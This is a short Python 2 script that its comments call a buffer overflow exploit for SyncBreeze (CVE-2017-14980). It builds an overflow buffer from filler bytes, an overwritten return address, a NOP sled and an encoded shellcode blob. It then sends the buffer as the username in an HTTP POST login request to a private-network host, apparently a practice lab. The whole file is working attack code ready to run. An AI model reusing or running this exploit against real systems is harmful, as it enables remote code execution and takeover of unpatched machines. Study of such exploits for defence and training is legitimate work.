#!/bin/python
# Buffer overflow exploit for SyncBreeze 
# CVE-2017-14980

import socket

try:
    print "\nSending Evil Buffer..."
    # Our shell code 
    shellcode = ("\xdb\xd0\xd9\x74\x24\xf4\x5b\xba\xd2\xd0\xbe\xa0\x31\xc9\xb1"
    "\x52\x31\x53\x17\x83\xc3\x04\x03\x81\xc3\x5c\x55\xd9\x0c\x22"
    "\x96\x21\xcd\x43\x1e\xc4\xfc\x43\x44\x8d\xaf\x73\x0e\xc3\x43"
    "\xff\x42\xf7\xd0\x8d\x4a\xf8\x51\x3b\xad\x37\x61\x10\x8d\x56"
    "\xe1\x6b\xc2\xb8\xd8\xa3\x17\xb9\x1d\xd9\xda\xeb\xf6\x95\x49"
    "\x1b\x72\xe3\x51\x90\xc8\xe5\xd1\x45\x98\x04\xf3\xd8\x92\x5e"
    "\xd3\xdb\x77\xeb\x5a\xc3\x94\xd6\x15\x78\x6e\xac\xa7\xa8\xbe"
    "\x4d\x0b\x95\x0e\xbc\x55\xd2\xa9\x5f\x20\x2a\xca\xe2\x33\xe9"
    "\xb0\x38\xb1\xe9\x13\xca\x61\xd5\xa2\x1f\xf7\x9e\xa9\xd4\x73"
    "\xf8\xad\xeb\x50\x73\xc9\x60\x57\x53\x5b\x32\x7c\x77\x07\xe0"
    "\x1d\x2e\xed\x47\x21\x30\x4e\x37\x87\x3b\x63\x2c\xba\x66\xec"
    "\x81\xf7\x98\xec\x8d\x80\xeb\xde\x12\x3b\x63\x53\xda\xe5\x74"
    "\x94\xf1\x52\xea\x6b\xfa\xa2\x23\xa8\xae\xf2\x5b\x19\xcf\x98"
    "\x9b\xa6\x1a\x0e\xcb\x08\xf5\xef\xbb\xe8\xa5\x87\xd1\xe6\x9a"
    "\xb8\xda\x2c\xb3\x53\x21\xa7\x7c\x0b\x5e\xf6\x15\x4e\xa0\xf9"
    "\x5e\xc7\x46\x93\xb0\x8e\xd1\x0c\x28\x8b\xa9\xad\xb5\x01\xd4"
    "\xee\x3e\xa6\x29\xa0\xb6\xc3\x39\x55\x37\x9e\x63\xf0\x48\x34"
    "\x0b\x9e\xdb\xd3\xcb\xe9\xc7\x4b\x9c\xbe\x36\x82\x48\x53\x60"
    "\x3c\x6e\xae\xf4\x07\x2a\x75\xc5\x86\xb3\xf8\x71\xad\xa3\xc4"
    "\x7a\xe9\x97\x98\x2c\xa7\x41\x5f\x87\x09\x3b\x09\x74\xc0\xab"
    "\xcc\xb6\xd3\xad\xd0\x92\xa5\x51\x60\x4b\xf0\x6e\x4d\x1b\xf4"
    "\x17\xb3\xbb\xfb\xc2\x77\xdb\x19\xc6\x8d\x74\x84\x83\x2f\x19"
    "\x37\x7e\x73\x24\xb4\x8a\x0c\xd3\xa4\xff\x09\x9f\x62\xec\x63"
    "\xb0\x06\x12\xd7\xb1\x02")

    # Creates the Buffer 

    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    nops = "\x90" * 10

    # Creates the web request 
    input_buffer = filler + eip + offset + nops + shellcode


    content = "username=" + input_buffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.193.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\r\n"
    buffer += "Accept: text/html,application/xhmtl+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    buffer += "Accept-Language: En-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Referer: http://192.168.193.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    # makes the connection to the web app 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.193.10", 80))
    s.send(buffer)

    s.close()

    print "\nDone!"

except:
    print "\nCould not connect!"




